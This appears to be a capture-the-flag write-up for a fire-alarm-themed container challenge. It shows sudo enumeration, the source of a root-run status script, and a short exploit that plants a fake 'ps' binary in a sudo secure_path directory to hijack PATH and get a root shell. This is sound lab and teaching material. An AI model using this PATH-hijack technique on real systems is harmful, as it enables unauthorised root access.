```
🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨
              DOSIS NEIGHBORHOOD FIRE ALARM SYSTEM - LOCKOUT MODE
🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨

🚨 EMERGENCY ALERT: Fire alarm system admin access has been compromised! 🚨
The fire safety systems are experiencing interference and 
admin privileges have been mysteriously revoked. The neighborhood's fire 
protection infrastructure is at risk!

⚠️ CURRENT STATUS: Limited to standard user access only
🔒 FIRE SAFETY SYSTEMS: Partially operational but restricted
🎯 MISSION CRITICAL: Restore full fire alarm system control

Your mission: Find a way to bypass the current restrictions and elevate to 
fire safety admin privileges. Once you regain full access, run the special 
command `/etc/firealarm/restore_fire_alarm` to restore complete fire alarm system control and 
protect the Dosis neighborhood from potential emergencies.

🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨🔥🚨
```

```bash

id
uid=1000(chiuser) gid=1000(chiuser) groups=1000(chiuser)


ls -la /etc/firealarm/restore_fire_alarm
ls: cannot access '/etc/firealarm/restore_fire_alarm': Permission denied
```

```bash
sudo -l
Matching Defaults entries for chiuser on 039d05d7e45f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    secure_path=/home/chiuser/bin\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+="API_ENDPOINT API_PORT RESOURCE_ID
    HHCUSERNAME", env_keep+=PATH

User chiuser may run the following commands on 039d05d7e45f:
    (root) NOPASSWD: /usr/local/bin/system_status.sh
```


```
/usr/local/bin/system_status.sh
=== Dosis Neighborhood Fire Alarm System Status ===
Fire alarm system monitoring active...

System resources (for alarm monitoring):
               total        used        free      shared  buff/cache   available
Mem:            31Gi       1.9Gi        21Gi       1.0Mi       8.0Gi        29Gi
Swap:             0B          0B          0B

Disk usage (alarm logs and recordings):
Filesystem      Size  Used Avail Use% Mounted on
overlay         296G   17G  267G   6% /
tmpfs            64M     0   64M   0% /dev
shm              64M     0   64M   0% /dev/shm
/dev/sda1       296G   17G  267G   6% /etc/hosts
tmpfs            16G     0   16G   0% /proc/acpi
tmpfs            16G     0   16G   0% /sys/firmware

Active fire department connections:
 07:46:48 up 14 days, 10:19,  0 users,  load average: 0.30, 0.22, 0.19
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

Fire alarm monitoring processes:
chiuser       22  0.0  0.0   3472  1616 pts/0    S+   07:46   0:00 grep -E (alarm|fire|monitor|safety)

🔥 Fire Safety Status: All systems operational
🚨 Emergency Response: Ready
📍 Coverage Area: Dosis Neighborhood (all sectors)
```

```
cat /usr/local/bin/system_status.sh
#!/bin/bash
echo "=== Dosis Neighborhood Fire Alarm System Status ==="
echo "Fire alarm system monitoring active..."
echo ""
echo "System resources (for alarm monitoring):" 
free -h
echo -e "\nDisk usage (alarm logs and recordings):"
df -h
echo -e "\nActive fire department connections:"
w
echo -e "\nFire alarm monitoring processes:"
ps aux | grep -E "(alarm|fire|monitor|safety)" | head -5 || echo "No active fire monitoring processes detected"
echo ""
echo "🔥 Fire Safety Status: All systems operational"
echo "🚨 Emergency Response: Ready"
echo "📍 Coverage Area: Dosis Neighborhood (all sectors)"
```

## Explotar

```
mkdir -p /home/chiuser/bin
echo -e '#!/bin/bash\n/bin/bash' > /home/chiuser/bin/ps
chmod +x /home/chiuser/bin/ps

export PATH=/home/chiuser/bin:$PATH

root@bc81a3ddc05a:/# /etc/firealarm/restore_fire_alarm


```